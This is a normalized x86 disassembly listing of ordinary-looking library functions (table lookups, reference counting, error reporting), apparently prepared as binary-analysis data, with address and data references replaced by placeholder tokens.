retn
dec esi
je r-xdata
mov edx [ edx + 0x4 ]
mov eax [ ecx + 0x4 ]
push edx
push eax
call sub_100212f0
add esp 0x8
dec esi
je r-xdata
mov eax [ edx + 0x4 ]
mov ecx [ ecx + 0x4 ]
push eax
push ecx
call sub_10021310
add esp 0x8
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
sub_10021c10
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
je r-xdata
pop ebp
retn
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push edi
call sub_1001e780
mov eax [ ebp + 0x4 ]
push sub_10021cd0
push eax
call sub_1001e730
lea ecx [ ebp + 0x34 ]
push ecx
push ebp
push 0x4
call sub_1001f490
mov eax [ ebp + 0xc ]
add esp 0x18
test eax eax
pop edi
pop ebx
je r-xdata
push esi
push ebp
call sub_1001d740
add esp 0x4
push eax
call sub_1001f960
add esp 0x4
test esi esi
je r-xdata
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
push edi
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push esi
call eax
add esp 0x4
push ebx
push edi
call sub_1001e7c0
mov esi eax
add esp 0x8
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop esi
push esi
call sub_1001d740
add esp 0x4
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esi
call eax
add esp 0x4
sub_10021cd0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_10022870
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
pop esi
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_100350a0
add esp 0x4
sub_10021d10
mov eax 0xcc
call sub_1001d0d0
mov eax [ esp + 0xd0 ]
push ebx
mov ebx [ esp + 0xd8 ]
push ebp
push esi
push edi
mov edi [ eax ]
mov eax ebx
dec eax
mov [ esp + 0x10 ] ebx
mov esi [ edi + 0x4 ]
je r-xdata
mov eax [ esp + 0xe8 ]
lea ecx [ esp + 0x80 ]
lea edx [ esp + 0x30 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x80 ] edx
mov [ esp + 0x44 ] eax
dec eax
jne r-xdata
push eax
push esi
call sub_1001e7c0
mov ebp eax
add esp 0x8
test ebp ebp
jne r-xdata
xor ebp ebp
jmp r-xdata
mov eax [ esp + 0xe8 ]
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x58 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x60 ] eax
jmp r-xdata
mov eax [ esp + 0xec ]
mov ecx [ ebp ]
mov [ eax ] ecx
mov ecx [ ebp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ eax ]
dec eax
je r-xdata
mov edx [ esp + 0xe0 ]
mov eax [ edi + 0x8 ]
push eax
mov esi [ edx + 0x4 ]
call sub_1001e7b0
add esp 0x4
cmp esi eax
jge r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push esi
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push 0x18c
push r--data
push 0x3
push 0x1
add ecx 0x10
dec eax
jne r-xdata
mov edx [ esp + 0xe0 ]
test ebp ebp
mov [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
push esi
push ecx
call sub_1001e7c0
mov ecx [ eax + 0x8 ]
add esp 0x8
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xcc
retn
push 0x18f
push r--data
push 0x6
push 0x1
add ecx 0xc
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xcc
retn
mov eax [ edi + 0x8 ]
inc esi
push eax
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov ecx [ ecx + 0x18 ]
test ecx ecx
je r-xdata
push ecx
call sub_1001f5f0
add esp 0x14
jmp r-xdata
mov edx [ eax + 0x4 ]
test edx edx
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0xec ]
push edx
push ebx
push eax
call ecx
add esp 0x10
test eax eax
jl r-xdata
mov ecx [ esp + 0xe0 ]
pop edi
pop esi
pop ebp
mov [ ecx + 0x4 ] eax
pop ebx
add esp 0xcc
retn
jne r-xdata
lea ebp [ esp + 0x18 ]
sub_10021ea0
mov eax 0x4
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x8 ] 0x1
test edi edi
jne r-xdata
push 0x14a
push r--data
push 0x8
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
push 0x153
push r--data
push 0xb
push 0x9
mov [ esi ] 0x1
mov [ esi + 0x4 ] edi
call sub_1001f5b0
mov eax [ esi ]
add esp 0x10
dec eax
je r-xdata
push 0x14d
push r--data
push 0x41
push 0x7c
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
mov ecx [ esi + 0x4 ]
push 0x18c
push r--data
push 0x3
add ecx 0x10
push 0x1
push ecx
dec eax
jne r-xdata
mov ecx [ esp + 0x18 ]
push esi
mov edx [ ecx + 0x4 ]
push edx
call sub_1001e6c0
add esp 0x8
cmp [ esi ] 0x1
je r-xdata
mov edx [ esp + 0x10 ]
push ebx
push ebp
push esi
mov ebx [ edx + 0x4 ]
push ebx
call sub_1001e620
mov edi eax
add esp 0x8
cmp edi 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
push 0x18f
push r--data
push 0x6
add eax 0xc
push 0x1
push eax
jmp r-xdata
push ebx
mov ebp edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jge r-xdata
push edi
push ebx
call sub_1001e7c0
add esp 0x8
jmp r-xdata
call sub_1001f5f0
add esp 0x14
push ebp
push ebx
call sub_1001e7c0
mov edx [ esi ]
mov edi eax
add esp 0x8
mov eax [ edi ]
mov ecx eax
sub ecx edx
mov [ esp + 0x1c ] ecx
jne r-xdata
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ esi ]
dec eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_100212f0
dec eax
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_10022870
dec eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edi + 0x4 ]
push edx
push eax
call sub_10021310
jmp r-xdata
push 0x161
push r--data
push 0xb
push 0xa
call sub_1001f5b0
mov eax [ esp + 0x20 ]
add esp 0x10
pop ebp
pop ebx
pop edi
pop esi
pop ecx
retn
push esi
call sub_1001d740
push 0x15c
push r--data
push 0x65
push 0x7c
push 0xb
call sub_1001de60
add esp 0x18
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov edx [ esi + 0x4 ]
push edx
call sub_100350a0
jmp r-xdata
mov eax edi
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
call sub_10021350
add esp 0x8
test eax eax
je r-xdata
add esp 0x8
test eax eax
jne r-xdata
add esp 0x4
push ebx
inc ebp
call sub_1001e7b0
add esp 0x4
cmp ebp eax
jge r-xdata
jmp r-xdata
sub_10022090
mov eax 0x4
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x8 ] 0x1
test edi edi
jne r-xdata
push 0x16c
push r--data
push 0x8
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
xor eax eax
pop esi
pop ecx
retn
push 0x175
push r--data
push 0xb
push 0x9
mov [ esi ] 0x2
mov [ esi + 0x4 ] edi
call sub_1001f5b0
mov eax [ esi ]
add esp 0x10
dec eax
je r-xdata
push 0x16f
push r--data
push 0x41
push 0x7d
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
mov ecx [ esi + 0x4 ]
push 0x18c
push r--data
push 0x3
add ecx 0x10
push 0x1
push ecx
dec eax
jne r-xdata
mov ecx [ esp + 0x18 ]
push esi
mov edx [ ecx + 0x4 ]
push edx
call sub_1001e6c0
add esp 0x8
cmp [ esi ] 0x1
je r-xdata
mov edx [ esp + 0x10 ]
push ebx
push ebp
push esi
mov ebx [ edx + 0x4 ]
push ebx
call sub_1001e620
mov edi eax
add esp 0x8
cmp edi 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
push 0x18f
push r--data
push 0x6
add eax 0xc
push 0x1
push eax
jmp r-xdata
push ebx
mov ebp edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jge r-xdata
push edi
push ebx
call sub_1001e7c0
add esp 0x8
jmp r-xdata
call sub_1001f5f0
add esp 0x14
push ebp
push ebx
call sub_1001e7c0
mov edx [ esi ]
mov edi eax
add esp 0x8
mov eax [ edi ]
mov ecx eax
sub ecx edx
mov [ esp + 0x1c ] ecx
jne r-xdata
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ esi ]
dec eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_100212f0
dec eax
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_10022870
dec eax
jne r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edi + 0x4 ]
push edx
push eax
call sub_10021310
jmp r-xdata
push 0x182
push r--data
push 0xb
push 0xa
call sub_1001f5b0
mov eax [ esp + 0x20 ]
add esp 0x10
pop ebp
pop ebx
pop edi
pop esi
pop ecx
retn
push esi
call sub_1001d740
push 0x17d
push r--data
push 0x65
push 0x7d
push 0xb
call sub_1001de60
add esp 0x18
mov [ esp + 0x10 ] 0x0
jmp r-xdata
mov edx [ esi + 0x4 ]
push edx
call sub_100350a0
jmp r-xdata
mov eax edi
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
call sub_10021350
add esp 0x8
test eax eax
je r-xdata
add esp 0x8
test eax eax
jne r-xdata
add esp 0x4
push ebx
inc ebp
call sub_1001e7b0
add esp 0x4
cmp ebp eax
jge r-xdata
jmp r-xdata
sub_10022280
mov eax 0x94
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xb0 ]
push edi
call sub_10021330
mov esi [ esp + 0xb0 ]
mov ebp eax
lea eax [ esp + 0x14 ]
push eax
push ebp
push 0x1
push esi
call sub_10021d10
add esp 0x14
cmp eax 0x1
je r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
push esi
call [ esi + 0x28 ]
add esp 0xc
test eax eax
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x10 ]
dec eax
je r-xdata
mov eax [ esp + 0xa8 ]
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov [ eax ] ecx
pop ebp
mov eax 0x1
pop ebx
add esp 0x94
retn
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
dec eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_10022870
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x94
retn
mov eax [ esp + 0x10 ]
dec eax
je r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_10022870
dec eax
jne r-xdata
mov eax [ esi ]
mov ebx edi
mov ecx [ eax + 0x4 ]
push ecx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jge r-xdata
mov ecx [ esi ]
lea edx [ esp + 0x48 ]
mov [ esp + 0x1c ] edx
lea edx [ esp + 0x18 ]
mov eax [ ecx + 0x4 ]
lea ecx [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x50 ] ecx
mov [ esp + 0x3c ] ebp
call sub_1001e620
mov edi eax
add esp 0x8
cmp edi 0xffffffff
je r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_100350a0
jmp r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call sub_10022870
add esp 0x4
dec eax
jne r-xdata
push 0x1f4
push r--data
push 0x6a
push 0x92
push 0xb
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn
mov ecx [ esp + 0x14 ]
push ecx
call sub_100350a0
jmp r-xdata
mov edx [ esi ]
push ebx
mov eax [ edx + 0x4 ]
push eax
call sub_1001e7c0
mov edi eax
add esp 0x8
cmp [ edi ] 0x1
jne r-xdata
add esp 0x4
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x94
retn
mov eax [ esp + 0x14 ]
push eax
call sub_100350a0
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn
add esp 0x4
mov ecx [ edi + 0x4 ]
push ecx
call sub_10021340
push eax
push ebp
call sub_10021390
add esp 0xc
test eax eax
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ esp + 0xb0 ]
push edx
push eax
push esi
call [ esi + 0x28 ]
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0xa8 ]
mov eax [ edi + 0x4 ]
mov [ ecx ] eax
mov eax [ edi ]
dec eax
je r-xdata
mov ecx [ esi ]
inc ebx
mov edx [ ecx + 0x4 ]
push edx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax [ edi + 0x4 ]
push 0x18c
push r--data
push 0x3
add eax 0x10
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x94
retn
mov edx [ edi + 0x4 ]
push 0x18f
push r--data
push 0x6
add edx 0xc
push 0x1
push edx
call sub_1001f5f0
add esp 0x14
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x94
retn
sub_100224d0
push esi
mov esi [ esp + 0x8 ]
mov eax 0x1
mov ecx [ esi + 0x54 ]
test ecx ecx
jne r-xdata
mov edx [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
inc edx
inc ecx
mov [ esi + 0x50 ] edx
mov [ esi + 0x54 ] ecx
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
push esi
call ecx
add esp 0x4
test eax eax
je r-xdata
pop esi
retn
sub_10022510
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x1
mov eax [ esi + 0x54 ]
dec eax
mov [ esi + 0x54 ] eax
jne r-xdata
push 0x0
push esi
call sub_100350e0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
push 0x72
push r--data
push 0x6a
push 0xbf
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push ebx
mov ebx [ esp + 0x14 ]
test ebx ebx
je r-xdata
push esi
call [ esi + 0x34 ]
add esp 0x4
mov edi eax
test ebx ebx
pop ebx
je r-xdata
push 0x61
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
add esp 0x10
test edi edi
jne r-xdata
push 0x64
push r--data
push 0x1e
push 0x9
call sub_1001f5b0
add esp 0x10
pop edi
xor eax eax
pop esi
retn
sub_100225b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push 0x81
push r--data
push 0x1e
push 0x9
call sub_1001f5b0
mov eax [ esi + 0x54 ]
add esp 0x10
test eax eax
mov edi 0x1
jne r-xdata
push 0x7e
push r--data
push 0x43
push 0x77
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov ecx [ esi + 0x50 ]
mov eax [ esi + 0x54 ]
inc ecx
inc eax
mov [ esi + 0x50 ] ecx
mov [ esi + 0x54 ] eax
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push esi
call eax
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push 0x83
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax edi
pop edi
pop esi
retn
sub_10022640
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
push 0x91
push r--data
push 0x1e
push 0x9
call sub_1001f5b0
mov eax [ esi + 0x54 ]
add esp 0x10
dec eax
mov edi 0x1
mov [ esi + 0x54 ] eax
jne r-xdata
push 0x8e
push r--data
push 0x43
push 0x6b
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push 0x0
push esi
call sub_100350e0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push 0x93
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
add esp 0x10
test edi edi
jne r-xdata
push 0x72
push r--data
push 0x6a
push 0xbf
push 0x26
call sub_1001de60
add esp 0x14
push 0x61
push r--data
push 0x1e
push 0xa
call sub_1001f5b0
push esi
call [ esi + 0x34 ]
push 0x64
push r--data
push 0x1e
push 0x9
mov edi eax
call sub_1001f5b0
add esp 0x24
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
push 0x96
push r--data
push 0x6a
push 0x6b
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
xor edi edi
sub_10022740
mov eax [ esp + 0x8 ]
push esi
push edi
mov esi [ eax ]
mov eax [ esp + 0xc ]
dec eax
je r-xdata
lea edx [ esi + 0x18 ]
xor edi edi
push edx
push esi
push 0xa
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x58 ] edi
call sub_1001f420
add esp 0xc
sub eax 0x2
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push esi
push 0xa
call sub_1001f490
mov ecx [ esi + 0x58 ]
push ecx
call sub_100355a0
mov edx [ esi + 0x38 ]
push edx
call sub_1002ef90
mov eax [ esi + 0x3c ]
push eax
call sub_10035560
mov ecx [ esi + 0x40 ]
push ecx
call sub_10035170
mov esi [ esi + 0x14 ]
add esp 0x1c
test esi esi
je r-xdata
sub eax 0x2
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
push esi
call sub_1001d740
add esp 0x4
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
je r-xdata
mov ecx [ esi ]
push edi
push edi
mov edx [ ecx + 0x14 ]
push edx
call sub_10034190
add esp 0xc
mov [ esi + 0x14 ] eax
mov eax 0x1
pop edi
pop esi
retn
push eax
call sub_1001d740
add esp 0x4
sub_10022890
mov eax [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
push r--data
mov ebx [ esi ]
push ebp
push esi
push eax
call sub_10030ec0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
sub ebx [ esi ]
add ebp ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
push ebp
lea ecx [ edi + 0x58 ]
push esi
push ecx
call sub_10035580
add esp 0xc
test eax eax
jne r-xdata
push r--data
push edi
call sub_10033840
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10022900
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x24 ]
test eax eax
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x35b
jge r-xdata
xor eax eax
add esp 0x20
retn
mov [ esp + 0x10 ] eax
lea eax [ esp ]
lea edx [ esp + 0x8 ]
push eax
push ecx
mov [ esp + 0x8 ] 0x3
mov [ esp + 0xc ] edx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x12c
mov eax [ eax + 0x4 ]
add esp 0x20
retn
lea edx [ eax + eax * 2 ]
lea eax [ edx * 8 + rw-data ]
add esp 0x20
retn
lea ecx [ eax + eax * 2 ]
mov edx [ ecx * 8 + rw-data ]
test edx edx
jne r-xdata
push 0x11b
jmp r-xdata
push r--data
push 0x65
push 0x67
push 0x8
call sub_1001de60
add esp 0x14
sub_100229a0
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x24 ]
test eax eax
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x35b
jge r-xdata
xor eax eax
add esp 0x20
retn
mov [ esp + 0x10 ] eax
lea eax [ esp ]
lea edx [ esp + 0x8 ]
push eax
push ecx
mov [ esp + 0x8 ] 0x3
mov [ esp + 0xc ] edx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x14c
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
add esp 0x20
retn
lea edx [ eax + eax * 2 ]
mov eax [ edx * 8 + rw-data ]
add esp 0x20
retn
lea ecx [ eax + eax * 2 ]
mov edx [ ecx * 8 + rw-data ]
test edx edx
jne r-xdata
push 0x13b
jmp r-xdata
push r--data
push 0x65
push 0x68
push 0x8
call sub_1001de60
add esp 0x14
sub_10022a40
mov eax 0x20
call sub_1001d0d0
mov eax [ esp + 0x24 ]
test eax eax
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x35b
jge r-xdata
xor eax eax
add esp 0x20
retn
mov [ esp + 0x10 ] eax
lea eax [ esp ]
lea edx [ esp + 0x8 ]
push eax
push ecx
mov [ esp + 0x8 ] 0x3
mov [ esp + 0xc ] edx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x16c
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x4 ]
add esp 0x20
retn
lea edx [ eax + eax * 2 ]
mov eax [ edx * 8 + rw-data ]
add esp 0x20
retn
lea ecx [ eax + eax * 2 ]
mov edx [ ecx * 8 + rw-data ]
test edx edx
jne r-xdata
push 0x15b
jmp r-xdata
push r--data
push 0x65
push 0x66
push 0x8
call sub_1001de60
add esp 0x14
sub_10022ae0
mov eax 0x8
call sub_1001d0d0
mov ecx [ esp + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x8
retn
add esp 0x8
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push sub_10023310
push 0x4
push 0x326
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_10023370
add esp 0x18
test eax eax
jne r-xdata
mov [ esp + 0x4 ] ecx
lea ecx [ esp ]
push ecx
push eax
mov [ esp + 0x8 ] 0x0
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax ]
mov eax [ ecx + 0x8 ]
add esp 0x8
retn
mov edx [ eax + 0x4 ]
mov eax [ edx + 0x8 ]
add esp 0x8
retn
sub_10022b70
mov eax 0x24
call sub_1001d0d0
mov eax [ esp + 0x2c ]
push ebx
push ebp
mov ebp [ esp + 0x30 ]
push esi
push edi
test eax eax
jne r-xdata
push 0xffffffff
push ebp
push 0x0
push 0x0
call sub_10030200
mov edi eax
add esp 0x10
test edi edi
jg r-xdata
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x38 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x6
push edi
push 0x0
call sub_1002eb00
mov ebx eax
push 0x1a9
push r--data
push ebx
call sub_1001d4c0
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24
retn
push 0x0
push sub_10022da0
push 0x4
push 0x354
lea ecx [ esp + 0x48 ]
push rw-data
push ecx
call sub_10023370
add esp 0x18
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push edx
push eax
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x20 ] ecx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
push 0x0
push 0x6
push edi
lea ecx [ esp + 0x48 ]
push 0x0
push ecx
mov [ esp + 0x50 ] esi
call sub_1002ea00
mov edx [ esp + 0x50 ]
push 0xffffffff
push ebp
push edi
push edx
call sub_10030200
lea eax [ esp + 0x34 ]
push ebx
push eax
push 0x0
mov [ esp + 0x40 ] esi
call sub_10030680
push esi
mov edi eax
call sub_1001d740
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
lea eax [ esp + 0x1c ]
mov [ esp + 0x20 ] ebp
mov [ esp + 0x38 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ eax ]
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
push 0x0
push sub_10022df0
push 0x4
push 0x354
lea ecx [ esp + 0x48 ]
push rw-data
push ecx
call sub_10023370
add esp 0x18
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push edx
push eax
mov [ esp + 0x1c ] 0x2
mov [ esp + 0x20 ] ecx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
jl r-xdata
test eax eax
jne r-xdata
mov edx [ eax ]
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x35b
jge r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x24
retn
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push eax
push ecx
mov [ esp + 0x1c ] 0x3
mov [ esp + 0x20 ] edx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
test eax eax
je r-xdata
push 0x12c
mov eax [ eax + 0x4 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
lea edx [ eax + eax * 2 ]
pop edi
pop esi
pop ebp
lea eax [ edx * 8 + rw-data ]
pop ebx
add esp 0x24
retn
lea ecx [ eax + eax * 2 ]
mov edx [ ecx * 8 + rw-data ]
test edx edx
jne r-xdata
push 0x11b
jmp r-xdata
push r--data
push 0x65
push 0x67
push 0x8
call sub_1001de60
add esp 0x14
sub_10022da0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
push esi
mov ecx [ eax ]
mov eax [ edx ]
mov esi [ ecx ]
mov eax [ eax ]
sbb eax eax
pop esi
sbb eax 0xffffffff
pop ebx
retn
test cl cl
je r-xdata
pop esi
xor eax eax
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10022df0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
push esi
mov ecx [ eax ]
mov eax [ edx ]
mov esi [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
sbb eax eax
pop esi
sbb eax 0xffffffff
pop ebx
retn
test cl cl
je r-xdata
pop esi
xor eax eax
pop ebx
retn
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_10022e40
mov eax 0x60
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x7c ]
xor ebx ebx
cmp edi ebx
mov [ esp + 0x10 ] ebx
je r-xdata
mov edx [ esp + 0x74 ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
xor eax eax
pop ebx
add esp 0x60
retn
cmp [ edi + 0x10 ] ebx
je r-xdata
cmp [ esp + 0x80 ] ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx [ edi + 0x10 ]
xor edi edi
cmp eax ebx
mov [ esp + 0x80 ] eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x7c ] edi
jle r-xdata
mov [ esp + 0x7c ] edi
mov esi [ edi + 0x8 ]
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
mov ebp [ esp + 0x74 ]
jmp r-xdata
test esi esi
mov ebx 0x3
jl r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
xor esi esi
xor ecx ecx
mov [ esp + 0x74 ] ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x35b
jge r-xdata
push ebx
push sub_10023310
push 0x4
push 0x326
lea eax [ esp + 0x8c ]
push rw-data
push eax
call sub_10023370
add esp 0x18
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1c ] ebx
push ecx
push eax
mov [ esp + 0x28 ] edi
call sub_1001ff80
add esp 0x8
cmp eax ebx
je r-xdata
test ecx ecx
je r-xdata
test bl 0x80
jne r-xdata
test esi esi
jl r-xdata
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x24 ]
push ecx
push eax
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] edx
mov [ esp + 0x34 ] esi
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
